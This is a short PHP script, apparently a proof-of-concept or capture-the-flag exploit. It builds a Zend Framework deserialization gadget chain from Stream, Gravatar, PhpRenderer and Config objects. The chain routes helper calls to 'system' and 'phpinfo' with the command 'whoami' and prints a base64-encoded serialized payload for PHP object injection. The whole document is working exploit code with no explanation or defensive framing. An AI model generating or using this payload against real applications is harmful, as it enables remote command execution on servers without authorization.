<?php

namespace Zend\Http\Response {
    class Stream
    {
        protected $cleanup = true;
        protected $streamName;

        public function __construct($streamName)
        {
            $this->streamName = $streamName;
        }
    }
}

namespace Zend\View\Helper{
    class Gravatar{
        protected $view;
//        protected $attributes = ["whoami"=>'a'];
        protected $attributes = ['whoami'=>1];
        public function __construct($view)
        {
            $this->view=$view;
        }
    }
}

namespace Zend\View\Renderer{
    class PhpRenderer{
        private $__helpers;
        public function __construct($__helpers)
        {
            $this->__helpers = $__helpers;
        }
    }
}

namespace Zend\Config{
    class Config{
        protected $data = [
            "escapehtml"=>'system',
            "escapehtmlattr"=>'phpinfo'
        ];
    }
}

namespace {
    $d = new Zend\Config\Config();
    $c = new Zend\View\Renderer\PhpRenderer($d);
    $b = new Zend\View\Helper\Gravatar($c);
    $a = new Zend\Http\Response\Stream($b);
    echo base64_encode(serialize($a));
}
